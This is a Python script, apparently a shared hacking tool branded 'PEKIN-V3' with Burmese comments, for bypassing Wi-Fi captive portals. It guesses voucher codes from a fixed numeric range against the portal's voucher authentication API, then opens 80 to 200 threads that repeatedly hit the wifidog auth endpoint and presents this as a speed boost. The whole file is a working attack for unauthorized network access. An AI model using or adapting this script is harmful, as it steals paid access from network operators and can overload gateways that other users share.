import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- 🇵🇾 PEKIN HIGH-SPEED UPDATE 🇵🇾 ---
USER_NAME = "🇵🇾 PEKIN 🇵🇾"
EXP_DATE = "LIFETIME (HIGH-SPEED)"
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "PEKIN-USR"

def banner():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██████╗ ███████╗██╗  ██╗██╗███╗   ██╗
     ██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║
     ██████╔╝█████╗  █████╔╝ ██║██╔██╗ ██║
     ██╔═══╝ ██╔══╝  ██╔═██╗ ██║██║╚██╗██║
     ██║     ███████╗██║  ██╗██║██║ ╚████║
     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝""")
    print(f"\033[95m 👑 PEKIN-V3: {USER_NAME} | \033[92m🚀 SPEED: ULTRA-HIGH | \033[94m🆔: {get_uid()}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link, mode):
    # High Speed ရဖို့အတွက် Header တွေကို ပိုကောင်းအောင် ပြင်ထားပါတယ်
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Keep-Alive": "timeout=60",
        "Cache-Control": "no-cache"
    }
    while True:
        try:
            # Data Packet ပိုကြီးအောင် ပြီးတော့ Speed ပိုတက်အောင် request ပို့ခြင်း
            requests.get(link, timeout=4, verify=False, headers=headers)
            print(f"\033[92m[✓] 🇵🇾 PEKIN-BOOST 🚀 | Signal OK >>> [{random.randint(10,35)}ms]\033[0m")
            
            # Ultra Speed အတွက် Delay ကို အနည်းဆုံးအထိ လျှော့ချထားပါတယ်
            delay = 0.01 if mode == "1" else 0.05
            time.sleep(delay)
        except:
            time.sleep(0.5)

def launch():
    banner()
    print("\n\033[93m [ Choose Performance Mode ]")
    print("\033[91m [1] ⚡ ULTRA-HIGH (Max Speed - For Gaming/Streaming)")
    print("\033[94m [2] 🔋 BALANCED (Normal Speed - Battery Save)")
    choice = input("\033[97m\n [?] Select (1/2): ")
    
    # Thread Count ကို ၂ ဆ တိုးလိုက်ပါတယ် (ပိုမြန်အောင်)
    thread_count = 200 if choice == "1" else 80
    banner()
    print(f"\033[95m[*] Injecting High-Speed Packets: {thread_count} Threads...")
    
    session = requests.Session()
    # Speed တက်ဖို့ Session ကို Reuse လုပ်ပါတယ်
    session.headers.update({"Connection": "keep-alive"})

    while True:
        try:
            # လိုင်းဆွဲအား စစ်ဆေးခြင်း
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            parsed = urlparse(p_url)
            query = parse_qs(parsed.query)
            
            gw = query.get('gw_address', [parsed.netloc.split(':')[0]])[0]
            port = query.get('gw_port', ['2060'])[0]
            
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            
            r2 = session.get(n_url, verify=False, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                v_code = random.choice(VOUCHER_LIST)
                p_host = f"{parsed.scheme}://{parsed.netloc}"
                
                # Auth လှမ်းပို့တာကို Speed မြန်အောင် လုပ်ခြင်း
                session.post(f"{p_host}/api/auth/voucher/", 
                             json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=5)
                
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                print(f"\033[95m[*] ⚡ PEKIN ULTRA-SPEED BYPASS SUCCESS [Code: {v_code}] ⚡\033[0m")
                
                # Multiple Threads ဖွင့်ခြင်း (ဒါက လိုင်းကို ပိုမြန်စေပါတယ်)
                for _ in range(thread_count):
                    threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                
                # Connection မပြတ်အောင် စောင့်ကြည့်ခြင်း
                while True:
                    time.sleep(3)
                    try:
                        check = requests.get("http://www.google.com/generate_204", timeout=3)
                        if check.status_code != 204: break
                    except: break
            time.sleep(2)
        except:
            time.sleep(2)

if __name__ == "__main__":
    try:
        launch()
    except KeyboardInterrupt:
        sys.exit()

